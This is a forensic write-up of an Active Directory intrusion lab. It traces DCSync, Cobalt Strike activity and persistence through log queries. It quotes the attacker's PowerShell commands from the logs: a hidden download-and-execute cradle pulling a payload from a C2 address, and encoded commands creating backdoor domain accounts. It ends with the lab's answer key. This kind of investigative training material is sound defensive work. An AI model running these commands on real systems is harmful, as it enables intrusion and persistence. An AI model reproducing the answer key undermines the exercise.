Query : (related.user:/[Ff][Vv][Ii][Dd][Aa][Ll]/) OR (winlog.event_data.TargetUserName:/[Ff][Vv][Ii][Dd][Aa][Ll]/) OR (winlog.event_data.SubjectUserName:/[Ff][Vv][Ii][Dd][Aa][Ll]/) OR (winlog.event_data.TargetUser:/[Ff][Vv][Ii][Dd][Aa][Ll]/) OR (winlog.event_data.User:/[Ff][Vv][Ii][Dd][Aa][Ll]/) OR (winlog.event_data.SourceUser:/[Ff][Vv][Ii][Dd][Aa][Ll]/)
```

[https://lh4.googleusercontent.com/wWop4UA8f2Egv-NusNYTo1LawPhqMp6M_vIaNjp4Iblf3hZyN1e92hWsCorkRlLKJVTA1ZMS2HkRR-YKrnt4NCOD69A0CYmMhNHZbJwKMZ9uur4XXilemaTcIbiugG_VtQCc2NUrmHQ2RwvNDp1ZbM4](https://lh4.googleusercontent.com/wWop4UA8f2Egv-NusNYTo1LawPhqMp6M_vIaNjp4Iblf3hZyN1e92hWsCorkRlLKJVTA1ZMS2HkRR-YKrnt4NCOD69A0CYmMhNHZbJwKMZ9uur4XXilemaTcIbiugG_VtQCc2NUrmHQ2RwvNDp1ZbM4)

Here are the activities observed for the user "**FVidal**":

1. "FVidal" logged into the DC (**Temple.secdojo.lab**) from the attacker's C2 server:

[https://lh6.googleusercontent.com/LDP9yMyRPUSaQEHcrLV4SnB0EgXFZliKBCB1TTMx2H1p5XhPuhTBE_x2UGQoEbXgMpXOpl1ygs-uCnC4dIwU8v_-oGCm-S_ElVPDpO68wodRVFuO6U0f__AvfFz6GQ2pFfSMBH7L2uHRtYnQ6XRWiVs](https://lh6.googleusercontent.com/LDP9yMyRPUSaQEHcrLV4SnB0EgXFZliKBCB1TTMx2H1p5XhPuhTBE_x2UGQoEbXgMpXOpl1ygs-uCnC4dIwU8v_-oGCm-S_ElVPDpO68wodRVFuO6U0f__AvfFz6GQ2pFfSMBH7L2uHRtYnQ6XRWiVs)

By examining the **LogonID** of the two login events:

- For the one with LogonID: 0x7c05d2

```yaml
Query:  winlog.event_data.SubjectLogonId:(0x7c05d2) OR winlog.event_data.TargetLogonId:(0x7c05d2)
```

there is nothing noteworthy to track. :

[https://lh6.googleusercontent.com/9JEg13F7MM8gX9lzEhr149fP5R02EdLf_H7Q1AaeGzmDrXBPMHIKbc41gl17f0RI-xgxDHlwmc2eGAMTPUu98WttfGK2aV9hXUr9k29w6FqZA9aq4YdbDPKKWJH68vQ2kZOJRh7BvXurkjs_hHjNGww](https://lh6.googleusercontent.com/9JEg13F7MM8gX9lzEhr149fP5R02EdLf_H7Q1AaeGzmDrXBPMHIKbc41gl17f0RI-xgxDHlwmc2eGAMTPUu98WttfGK2aV9hXUr9k29w6FqZA9aq4YdbDPKKWJH68vQ2kZOJRh7BvXurkjs_hHjNGww)

- On the other hand the logon ID: 0x7c0625

```yaml
Query:  winlog.event_data.SubjectLogonId:(0x7c0625) OR winlog.event_data.TargetLogonId:(0x7c0625)
```

[https://lh5.googleusercontent.com/4Ta1QBRcHtd_Ikd31LavkOzRspYb56oN1C7VDbs3Y4U_kjTrRWdooAsqitL_jZMcqht-yagdW6KdHZ3K7iGh6S05nNhyBOCBb5b_7MYv_-6jDRZ--bvcRI9gsDy5iy8rWBWbhBjMosQkG1fcLQug_mU](https://lh5.googleusercontent.com/4Ta1QBRcHtd_Ikd31LavkOzRspYb56oN1C7VDbs3Y4U_kjTrRWdooAsqitL_jZMcqht-yagdW6KdHZ3K7iGh6S05nNhyBOCBb5b_7MYv_-6jDRZ--bvcRI9gsDy5iy8rWBWbhBjMosQkG1fcLQug_mU)

We should focus our attention on the events related to **Directory Service Access**, which seem to hold valuable information. To do this, we will filter these events and specifically look for those associated with the Subject username "**FVidal**”:

```yaml
Query : (event.code:4662) AND (winlog.event_data.SubjectUserName:/[Ff][Vv][Ii][Dd][Aa][Ll]/)
```

[https://lh6.googleusercontent.com/CwrXO1bVCcDEa3YZwAGuGlMeTU1-6dHEOotFRwO62UcpSisxCjq227GH5L3XppVfjTevq6pZRD-m1F8_2Y2XCCbzrFn9JhTyl6We0NTPC_ZAexqNRvNdLbkZzdy8-EPGVddQZDkB4WityJZ5VJ731bs](https://lh6.googleusercontent.com/CwrXO1bVCcDEa3YZwAGuGlMeTU1-6dHEOotFRwO62UcpSisxCjq227GH5L3XppVfjTevq6pZRD-m1F8_2Y2XCCbzrFn9JhTyl6We0NTPC_ZAexqNRvNdLbkZzdy8-EPGVddQZDkB4WityJZ5VJ731bs)

As observed, a **Dcsync** activity was detected in Windows Security **Event ID 4662**. Key indicators include a **non-computer-based** account (**FVidal**), an access mask of **0x100**, targeting an Active Directory object of class **domainDNS**, and utilizing the Control Access Rights **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All**.

At this stage, the attacker has acquired the NTLM hashes for crucial accounts in the Active Directory, such as **Administrator** and **krbtgt**. This provides the attacker with the means to potentially log in and execute further suspicious activities.

Now, let's proceed to check if there are any logging or other events involving the use of **Administrator** or **krbtgt** from the attacker's IP (**192.168.11.18**) subsequent to obtaining the NTLM hashes :

```yaml
Query : (related.user:/[Aa][Dd][Mm][Ii][Nn][Ii][Ss][Tt][Rr][Aa][Tt][Oo][Rr]/) OR (winlog.event_data.TargetUserName:/[Aa][Dd][Mm][Ii][Nn][Ii][Ss][Tt][Rr][Aa][Tt][Oo][Rr]/) OR (winlog.event_data.SubjectUserName:/[Aa][Dd][Mm][Ii][Nn][Ii][Ss][Tt][Rr][Aa][Tt][Oo][Rr]/) OR (winlog.event_data.TargetUser:/[Aa][Dd][Mm][Ii][Nn][Ii][Ss][Tt][Rr][Aa][Tt][Oo][Rr]/) OR (winlog.event_data.User:/[Aa][Dd][Mm][Ii][Nn][Ii][Ss][Tt][Rr][Aa][Tt][Oo][Rr]/) OR (winlog.event_data.SourceUser:/[Aa][Dd][Mm][Ii][Nn][Ii][Ss][Tt][Rr][Aa][Tt][Oo][Rr]/) OR (related.user:/[Kk][Rr][Bb][Tt][Gg][Tt]/) OR (winlog.event_data.TargetUserName:/[Kk][Rr][Bb][Tt][Gg][Tt]/) OR (winlog.event_data.SubjectUserName:/[Kk][Rr][Bb][Tt][Gg][Tt]/) OR (winlog.event_data.TargetUser:/[Kk][Rr][Bb][Tt][Gg][Tt]/) OR (winlog.event_data.User:/[Kk][Rr][Bb][Tt][Gg][Tt]/) OR (winlog.event_data.SourceUser:/[Kk][Rr][Bb][Tt][Gg][Tt]/)
```

[https://lh3.googleusercontent.com/4llT8wivQm6GDcHqCsvvrmRWmi5JNnqWRfecUrdtCnVJKvB7ZpPtPk_hc5-mTzwfbDQcMjjAiGC1_T5HBo8orDYqcsaZvyMNHd7CoqVos4QPWLRG1ReEh2zcNJtJO1475Z-A0zEfGhRJBIR4seByH-Y](https://lh3.googleusercontent.com/4llT8wivQm6GDcHqCsvvrmRWmi5JNnqWRfecUrdtCnVJKvB7ZpPtPk_hc5-mTzwfbDQcMjjAiGC1_T5HBo8orDYqcsaZvyMNHd7CoqVos4QPWLRG1ReEh2zcNJtJO1475Z-A0zEfGhRJBIR4seByH-Y)

As we can discern, there is network communication with the attacker's C2 server through PowerShell. To gain further insight, we will trace the process with **PID 3544**, using the following queries :

```yaml
(process.pid:3544) OR (process.parent.pid:3544)
```

```yaml
(process.pid:2620) OR (process.parent.pid:2620)
```

```yaml
(process.pid:756) OR (process.parent.pid:756)
```

Upon investigating process **ID 3544**, we find that it is associated with a PowerShell command line to download an "**apt2**" file from the attacker's C2 server:

[https://lh5.googleusercontent.com/wWkvTduutM6p5FOKwS1j-IyNezD6C-0OPNN8YNu38sfalcITURj7lRSTPH5CYqmkFmJol-o4KIS4hlFnNuZvaNLq3L1p4sCHO5q7Y0E_O-gCeS4NncsGUe8TFz_BfY27_AkJ7k4coLJEHqX7c5eQ4Ho](https://lh5.googleusercontent.com/wWkvTduutM6p5FOKwS1j-IyNezD6C-0OPNN8YNu38sfalcITURj7lRSTPH5CYqmkFmJol-o4KIS4hlFnNuZvaNLq3L1p4sCHO5q7Y0E_O-gCeS4NncsGUe8TFz_BfY27_AkJ7k4coLJEHqX7c5eQ4Ho)

[https://lh5.googleusercontent.com/t67N93iYADKWh5Gzv8ofPAVrGaGX6BkmrQYBJ_6ldnlmb3meTDtCN-BU_QkiJD5fQZ9CdD3FjYfUYHcdg0AOOm7NPQH10UkZhNoYpIgjJmipxTZUmIsEO3J6FgVgM3SCfzmkwhNACGpp0p0AfEs1fi8](https://lh5.googleusercontent.com/t67N93iYADKWh5Gzv8ofPAVrGaGX6BkmrQYBJ_6ldnlmb3meTDtCN-BU_QkiJD5fQZ9CdD3FjYfUYHcdg0AOOm7NPQH10UkZhNoYpIgjJmipxTZUmIsEO3J6FgVgM3SCfzmkwhNACGpp0p0AfEs1fi8)

As we observe, this sequence of events began with process **ID 756**, which serves as a parent process for two instances of the executable **C:\Windows\system32\wsmprovhost.exe**. These instances possess **different LogonIDs**. To comprehensively understand the attacker's activities using the Administrator account, we will track the **LogonIDs** associated with these **two sessions**.

Let's commence by examining the first session, as it occurred immediately after the **Dcsync** event:

```yaml
Query : (winlog.logon.id : 0x7c2203) OR (winlog.event_data.LogonId : 0x7c2203)
```

[https://lh5.googleusercontent.com/DFIjWHOcoWl4Y0sjV1b2wBytcj0nvyVAnnQRi9R1kji7Q6mZeg7fpOBpprvdWMvpoVdOHzeFSOfxRVocyqiWietRvQO0uSEwH3OLG5RFMksbVkLaXrJ89Gs01_90Mgrl9KyQZ32ezmAmzkZlnwyOXnM](https://lh5.googleusercontent.com/DFIjWHOcoWl4Y0sjV1b2wBytcj0nvyVAnnQRi9R1kji7Q6mZeg7fpOBpprvdWMvpoVdOHzeFSOfxRVocyqiWietRvQO0uSEwH3OLG5RFMksbVkLaXrJ89Gs01_90Mgrl9KyQZ32ezmAmzkZlnwyOXnM)

Numerous intriguing events have been identified, but we will begin by investigating the process creation events.

```yaml
Query : (event.code: (4688 OR 1)) AND ((winlog.logon.id : 0x7c2203) OR (winlog.event_data.LogonId : 0x7c2203))
```

[https://lh4.googleusercontent.com/r8in6WDyHLVsp36FGG9xLstItMfD_0-caCc-VWN7TpEngjT4NLDm0Xi3FEnbjGPBk2t0_PNN-jb7st3BTIoK5l4Rdb8QoDrET9g63XLkYhoxnxQhTzIUXEG9RKmEJ_MpyjPTRNF_L9SbO2oHnzEsSLo](https://lh4.googleusercontent.com/r8in6WDyHLVsp36FGG9xLstItMfD_0-caCc-VWN7TpEngjT4NLDm0Xi3FEnbjGPBk2t0_PNN-jb7st3BTIoK5l4Rdb8QoDrET9g63XLkYhoxnxQhTzIUXEG9RKmEJ_MpyjPTRNF_L9SbO2oHnzEsSLo)

As we can observe, process **PID 3544**, which corresponds to the PowerShell command responsible for downloading the "**apt2**" file from the C2 server at **192.168.11.18**, acts as the parent process for all the processes in the query hits.

Within these query hits, we have identified several significant activities, and we will highlight the key ones:

1. The PowerShell commands:

```powershell
"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('<http://192.168.11.18:80/apt2>'))"
```

**The first is about downloading apt2 file from the attacker C2 server**

```powershell
powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBEAG8AbQBhAGkAbgBTAGkAZAA=

Base64 decode = Get-DomainSid
```

```powershell
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA0ADcAMAAwADUALwAnACkAOwAgAEcAZQB0AC0ARABvAG0AYQBpAG4AUwBpAGQA

Base64 decode: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:47005/'); Get-DomainSid
```

**This command is a PowerView module that returns the SID for the current or specified domain.**

```powershell
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADkAOAAyADQALwAnACkAOwAgAE4AZQB3AC0AQQBEAFUAcwBlAHIAIAAtAE4AYQBtAGUAIAAiAGUAbABvAG4AIABtAHUAcwBrACIAIAAgAC0AUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACAAIgBlAC4AbQB1AHMAawAiACAALQBVAHMAZQByAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAIABlAC4AbQB1AHMAawBAAHMAZQBjAGQAbwBqAG8ALgBsAGEAYgAgAC0AQQBjAGMAbwB1AG4AdABQAGEAcwBzAHcAbwByAGQAIAAoAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAiAFAAQQBTAFMAdwBkADEAMgAzACIAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlACkAIAAtAFAAYQBzAHMAVABoAHIAdQAgAHwAIABFAG4AYQBiAGwAZQAtAEEARABBAGMAYwBvAHUAbgB0AA==

Base64 decode: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:19824/'); New-ADUser -Name "elon musk"  -SamAccountName "e.musk" -UserPrincipalName e.musk@secdojo.lab -AccountPassword (ConvertTo-SecureString "PASSwd123" -AsPlainText -Force) -PassThru | Enable-ADAccount

```

```powershell
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA1ADUANQAxADUALwAnACkAOwAgAEcAZQB0AC0ARABvAG0AYQBpAG4AVQBzAGUAcgAgAC0ASQBkAGUAbgB0AGkAdAB5ACAAZQAuAG0AdQBzAGsAIAAtAFAAcgBvAHAAZQByAHQAaQBlAHMAIABEAGkAcwBwAGwAYQB5AE4AYQBtAGUALAAgAE0AZQBtAGIAZQByAE8AZgA=

Base64 decode: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:55515/'); Get-DomainUser -Identity e.musk -Properties DisplayName, MemberOf
```

```powershell
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA2ADAAOAA3ADQALwAnACkAOwAgAE4AZQB3AC0AQQBEAFUAcwBlAHIAIAAtAE4AYQBtAGUAIAAiAEUAbABvAG4AIABOAG8AdABtAHUAcwBrACIAIAAtAEcAaQB2AGUAbgBOAGEAbQBlACAAIgBFAGwAbwBuACIAIAAtAFMAdQByAG4AYQBtAGUAIAAiAE4AbwB0AE0AdQBzAGsAIgAgAC0AVQBzAGUAcgBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlACAAIgBlAGwAbwBuAC4AbgBvAHQAbQBzAHUAawBAAHMAZQBjAGQAbwBqAG8ALgBsAGEAYgAiACAALQBBAGMAYwBvAHUAbgB0AFAAYQBzAHMAdwBvAHIAZAAgACgAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgACIAUABAAHMAcwB3ADAAcgBkACIAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlACkAIAAtAEUAbgBhAGIAbABlAGQAIAAkAHQAcgB1AGUA

Base64 decode: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:60874/'); New-ADUser -Name "Elon Notmusk" -GivenName "Elon" -Surname "NotMusk" -UserPrincipalName "elon.notmsuk@secdojo.lab" -AccountPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -Enabled $true
```

```powershell
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA2ADAANAAyADEALwAnACkAOwAgAEcAZQB0AC0ARABvAG0AYQBpAG4AVQBzAGUAcgAgAC0ASQBkAGUAbgB0AGkAdAB5ACAAZQBsAG8AbgAuAG0AdQBzAGsAIAAtAFAAcgBvAHAAZQByAHQAaQBlAHMAIABEAGkAcwBwAGwAYQB5AE4AYQBtAGUALAAgAE0AZQBtAGIAZQByAE8AZgA=

Base64 decode: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:60421/'); Get-DomainUser -Identity elon.musk -Properties DisplayName, MemberOf
```

To summarize, the last four PowerShell commands indicate that the attacker has created two usernames:

1. **elon musk (e.mask)** with the password **PASSwd123** and enabled the account.
2. **Elon Notmusk** with the password **P@ssw0rd** also enabled the account.

After each creation, a check was performed to confirm the existence of the created user and to identify the domain to which they belong.

2. In addition to the PowerShell commands, there are other commands related to enumerating domain users.

Now, let's examine the other events associated with the process ID **3544**:

[https://lh5.googleusercontent.com/O51eHzO1czhiH0ypobrDlZG8T9dbI4-Pxc6RPsZ4zL_cgDydnirrhXXO9-uSRolSTZR3Kd_T-SylfEnpYFRKFe2V5JKoHW9fUr_eS3XWPwqfZyRjK4rbHIF3nA9aeZTEsk28kzyvflfTgQsJpK8UmP0](https://lh5.googleusercontent.com/O51eHzO1czhiH0ypobrDlZG8T9dbI4-Pxc6RPsZ4zL_cgDydnirrhXXO9-uSRolSTZR3Kd_T-SylfEnpYFRKFe2V5JKoHW9fUr_eS3XWPwqfZyRjK4rbHIF3nA9aeZTEsk28kzyvflfTgQsJpK8UmP0)

The remaining events are tied to the creation of the two users, **e.mask** and **Elon Notmusk.** This action aligns with the decoded base64 PowerShell command, confirming the successful creation of these users.

One noteworthy observation is that the attacker **deleted the user** **e.musk** approximately 13 minutes after creating it.

Furthermore, by tracing the **process ID without a specific logonID**, we discover that a file was created:

[https://lh3.googleusercontent.com/cl1fKQIOceV-GeExeZdjOGuNu0pIINrGTuoZA81SSk4xpJ1T3MZuNcatqDTAGgGJpTcty6QNsAsJS8eO1B5AX1v-wUF6GMzMkexXOUsVR6rg32hwQm2dQ9xd950_gFXhK3jE5-BeslC0BvpOeu-zR70](https://lh3.googleusercontent.com/cl1fKQIOceV-GeExeZdjOGuNu0pIINrGTuoZA81SSk4xpJ1T3MZuNcatqDTAGgGJpTcty6QNsAsJS8eO1B5AX1v-wUF6GMzMkexXOUsVR6rg32hwQm2dQ9xd950_gFXhK3jE5-BeslC0BvpOeu-zR70)

**Rubeus.exe** which is a C# toolkit for Kerberos interaction and abuses. Kerberos, as we all know, is a ticket-based network authentication protocol and is used in Active Directories. Unfortunately, due to human error, oftentimes AD is not configured properly keeping security in mind. Rubeus can exploit vulnerabilities arising out of these misconfigurations and perform functions such as crafting keys and granting access using forged certificates. The article serves as a guide on using Rubeus in various scenarios.

**However, it's important to note that we couldn't find any usage of this tool in the logs. 🙁**

Anyway, let's proceed to track the other logonID associated with the process ID **756**:

[https://lh5.googleusercontent.com/t67N93iYADKWh5Gzv8ofPAVrGaGX6BkmrQYBJ_6ldnlmb3meTDtCN-BU_QkiJD5fQZ9CdD3FjYfUYHcdg0AOOm7NPQH10UkZhNoYpIgjJmipxTZUmIsEO3J6FgVgM3SCfzmkwhNACGpp0p0AfEs1fi8](https://lh5.googleusercontent.com/t67N93iYADKWh5Gzv8ofPAVrGaGX6BkmrQYBJ_6ldnlmb3meTDtCN-BU_QkiJD5fQZ9CdD3FjYfUYHcdg0AOOm7NPQH10UkZhNoYpIgjJmipxTZUmIsEO3J6FgVgM3SCfzmkwhNACGpp0p0AfEs1fi8)

```yaml
Query : (winlog.logon.id : 0x82a906) OR (winlog.event_data.LogonId : 0x82a906)
```

[https://lh4.googleusercontent.com/vSbVYPASP0gnVaKwmYuBv9xI5HFU2vjNswtgXjwBwcSYXZ0iBc_cBEh19JyMEdlEBvQp9Mea5_ckM7mdfrt6sbJgUpaNV-NhpU7QQP4FfprXcNJcVlD_9nzbbC6JOZr8WmNR6Vyd-2RWCxq1NCMzc4A](https://lh4.googleusercontent.com/vSbVYPASP0gnVaKwmYuBv9xI5HFU2vjNswtgXjwBwcSYXZ0iBc_cBEh19JyMEdlEBvQp9Mea5_ckM7mdfrt6sbJgUpaNV-NhpU7QQP4FfprXcNJcVlD_9nzbbC6JOZr8WmNR6Vyd-2RWCxq1NCMzc4A)

As we can see, we were trying to enumerate the domain users and also trying to search if there was a user named **Enotmsuk**.

Also, he created a scheduled a task named “**NewADupdate**” as a **persistence** mechanism.

# Objectif 3: Determine which C2 framework was used by the attacker

A Command and Control (C2) framework serves as the infrastructure employed by an attacker or adversary. It encompasses a set of tools and techniques utilized for communicating with compromised devices, typically established after gaining an initial foothold during the initial compromise. The Command and Control communication method and infrastructure, commonly referred to as C2, are pivotal components in maintaining control over the compromised network.

Numerous C2 frameworks are available, ranging from commercial to open-source solutions. Some of the prominent C2 frameworks include:

1. Cobalt Strike
2. Empire
3. Light C2
4. Machete
5. Sliver

In our specific case, based on the analysis of sysmon event logs, it appears that the attacker was operating with a Cobalt Strike framework. We will proceed to list the associated indicators below:

1- Cobalt Strike Named Pipes : [https://research.splunk.com/endpoint/5876d429-0240-4709-8b93-ea8330b411b5/](https://research.splunk.com/endpoint/5876d429-0240-4709-8b93-ea8330b411b5/)

```yaml
Query: event.code:(17 OR 18) AND [file.name](http://file.name/):(\\msagent_* OR \\DserNamePipe* OR \\srvsvc_* OR \\postex_* OR \\status_* OR \\MSSE-* OR \\spoolss_* OR \\win_svc* OR \\ntsvcs* OR \\winsock* OR \\UIA_PIPE*)
```

![Untitled](Temple%20Writeup%20250eca1d8c714ad58a49c533430e1e3d/Untitled%201.png)

As we can we got some hits for named pipe that start with **\postex_**

**2- rundll32 without any command-line :**

Cobalt Strike spawns rundll32 without any command-line and regularly injects the necessary payload code into rundll32’s memory. Therefore, you must check for the creation of rundll32 without any command-line arguments unaffected by the noise.

```yaml
Queury: (event.code : 1) AND (process.executable:**\\rundll32.exe) AND (process.command_line:**\\rundll32.exe)
```

![Untitled](Temple%20Writeup%20250eca1d8c714ad58a49c533430e1e3d/Untitled%202.png)

There are numerous signs pointing to the utilization of Cobalt Strike that we could look for, but we'll conclude our investigation with the mentioned artifacts.

# **Timeline**

Here is a summary with a timeline of the attacker's activities on the network:

![Untitled](Temple%20Writeup%20250eca1d8c714ad58a49c533430e1e3d/Untitled%203.png)

# LAB Answers :

```yaml
Q1: Which service did the attacker exploit to get a foothold?

Answer: SMB
```

```yaml
Q2: Which account was compromised by the attacker for the foothold?

Answer: mark
```

```yaml
Q3: Which Privilege Escalation tool was used in Bastion?

Answer: PowerUp
```

```yaml
Q4: What's the name of the BloodHound collector used by the attacker in Bastion?

Answer: SharpHound
```

```yaml
Q5: What was the privilege escalation technique in Bastion ?

Answer: Modifiable Service
```

```yaml
Q6: What's the name of persistence technique used in both machines?

Answer: Scheduled Tasks
```

```yaml
Q7: What's the name of the C2 used in the attack?

Answer: Cobalt Strike
```

```yaml
Q8: What's the name of the attacked Domain Controller?

Answer: secdojo.lab
```

```yaml
Q9: What is the name of the account that was used to enumerate the Domain Controller?

Answer : tsilva
```

```yaml
Q10: Which of the following tools was used to enumerate the Active Diretory?

Answer: SharpHound
```

```yaml
Q11: What is the name of the account compromised by the attacker to complete the attack?

Answer: FVidal
```

```yaml
Q12: What's the name of the AD user created and deleted by the attacker?

Answer: e.musk
```
